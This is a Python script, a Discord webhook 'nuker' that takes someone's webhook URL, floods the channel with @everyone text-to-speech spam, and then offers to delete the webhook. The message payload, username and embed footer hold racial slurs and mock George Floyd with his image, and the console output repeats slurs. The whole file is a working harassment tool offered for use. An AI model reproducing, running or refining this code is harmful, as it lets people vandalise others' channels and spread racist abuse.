import requests
import json
import time
import colorama
from colorama import Fore, Style
import os
colorama.init(autoreset=True)

def cls():
    os.system("cls")

banner = """
    ______                __                                                 
   / __/ /___  __  ______/ /  _________  ____ _____ ___  ____ ___  ___  _____
  / /_/ / __ \/ / / / __  /  / ___/ __ \/ __ `/ __ `__ \/ __ `__ \/ _ \/ ___/
 / __/ / /_/ / /_/ / /_/ /  (__  ) /_/ / /_/ / / / / / / / / / / /  __/ /    
/_/ /_/\____/\__, /\__,_/  /____/ .___/\__,_/_/ /_/ /_/_/ /_/ /_/\___/_/     
            /____/             /_/                                           


"""

def main():
    while True:
        cls()
        print(Fore.RED + banner)
        def wbmsg(webhookurl, message):
            payload = {
  "content": f"ur shitty webhook got nuked @everyone\n\nhttps://www.youtube.com/watch?v=XkEGGLu_fNU\n\nAlso whoever used this tool has a very nice thing to say to you 😁😁\n\n{message}",
  "tts": True,
  "embeds": [
    {
      "id": 665323853,
      "description": "",
      "fields": [],
      "author": {
        "name": "George floyd",
        "url": "https://www.youtube.com/watch?v=XkEGGLu_fNU"
      },
      "title": "ur shitty webhook got nuked lmfao",
      "url": "https://www.youtube.com/watch?v=XkEGGLu_fNU",
      "color": 6242100,
      "image": {
        "url": "https://upload.wikimedia.org/wikipedia/en/9/9c/George_Floyd.png"
      },
      "thumbnail": {
        "url": "https://upload.wikimedia.org/wikipedia/en/9/9c/George_Floyd.png"
      },
      "footer": {
        "icon_url": "https://www.youtube.com/watch?v=XkEGGLu_fNU",
        "text": "nigger"
      }
    }
  ],
  "components": [],
  "actions": {},
  "username": "dumbass niggers",
  "avatar_url": "https://pbs.twimg.com/media/GSLgbVVWAAA-9hv?format=jpg&name=small"
}
            headers = {
                "Content-Type": "application/json"
            }
            spam = requests.post(webhookurl+"?wait=true", data=json.dumps(payload), headers=headers)
            if spam.status_code == 204:
                print(f"{Fore.WHITE}{Style.BRIGHT}[+] sent message on {webhookurl}\n{spam.text} ")
            else:
                print(f"{Fore.WHITE}{Style.BRIGHT}[-] failed to send message {spam.text}")
            
                
        def wbspam(webhookurl, message, count):
            for _ in range(count):
                wbmsg(webhookurl, message)
        
        def delwb(webhookurl):
            cls()
            print(Fore.RED + banner)
            gyat = input(Fore.WHITE + Style.BRIGHT + "[!] Delete webhook? " + Style.RESET_ALL)
            if gyat.lower() == "y":
                requests.delete(webhookurl)
            else:
                print(Fore.WHITE + Style.BRIGHT + "[-] ok niga im not deleting this webhook do whatever tf u want with it idfc")
            time.sleep(0.7)
            
        webhookurl =  input(Fore.WHITE + Style.BRIGHT + "[!] Enter webhook url: ")
        valid = requests.get(webhookurl)
        if valid.status_code == 200:
            print(f"valid webhook {valid.status_code}")
            message = input(Fore.WHITE + Style.BRIGHT + "[!] Enter message: ")
            count = int(input(Fore.WHITE + Style.BRIGHT + "[!] Enter spam amount "))
            wbspam(webhookurl, message, count)
            delwb(webhookurl)

        else:
            print(f"invalid webhook nigga {valid.status_code}")
            time.sleep(1)

main()
